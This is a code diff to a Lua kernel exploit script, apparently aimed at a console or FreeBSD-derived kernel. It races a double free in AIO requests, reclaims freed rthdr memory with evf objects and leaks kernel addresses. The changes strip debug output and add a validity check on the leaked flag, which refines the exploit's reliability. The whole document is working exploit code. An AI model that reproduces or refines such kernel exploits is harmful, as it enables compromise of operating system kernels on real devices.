@@ -835,10 +835,6 @@ function double_free_reqs2(sds)
 
     for i=1,NUM_RACES do
 
-        print()
-        printf("== double free - attempt #%d ==", i)
-        print()
-
         local sd_client = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
         if sd_client == -1 then
             error("socket() error: " .. get_error_string())
@@ -939,10 +935,6 @@ function leak_kernel_addrs(sd_pair)
     local evf = nil
     for i=1, NUM_ALIAS do
 
-        print()
-        printf("== evf - attempt #%d ==", i)
-        print()
-
         local evfs = {}
 
         -- reclaim freed rthdr with evf object
@@ -955,20 +947,24 @@ function leak_kernel_addrs(sd_pair)
 
         -- for simplicty, we'll assume i < 2**16
         local flag = memory.read_dword(buf):tonumber()
-        local idx = bit32.rshift(flag, 16) 
-        local expected_flag = bit32.bor(flag, 1)
+
+        if bit32.band(flag, 0xf00) == 0xf00 then
+
+            local idx = bit32.rshift(flag, 16) 
+            local expected_flag = bit32.bor(flag, 1)
+            
+            evf = evfs[idx]
+
+            set_evf_flags(evf, expected_flag)
+            get_rthdr(sd, buf, 0x80)
+
+            local val = memory.read_dword(buf):tonumber()
+            if val == expected_flag then
+                table.remove(evfs, idx)
+            else
+                evf = nil
+            end
         
-        evf = evfs[idx]
-
-        set_evf_flags(evf, expected_flag)
-        get_rthdr(sd, buf, 0x80)
-
-        local val = memory.read_dword(buf):tonumber()
-
-        if val == expected_flag then
-            table.remove(evfs, idx)
-        else
-            evf = nil
         end
 
         for _, each_evf in ipairs(evfs) do
@@ -1028,15 +1024,13 @@ function kexploit()
     -- catch lua error so we can do clean up
     local err = run_with_coroutine(function()
 
-        print("[+] Setup")
+        print("\n[+] Setup\n")
         block_id, groom_ids = setup(block_fd)
 
-        dbgf("block_id %s groom_ids %s", hex(block_id), hex(groom_ids))
-    
-        print("[+] Double-free AIO")
+        print("\n[+] Double-free AIO\n")
         local sd_pair = double_free_reqs2(sds)
 
-        print("[+] Leak kernel addresses")
+        print("\n[+] Leak kernel addresses\n")
         leak_kernel_addrs(sd_pair)
     
     end)
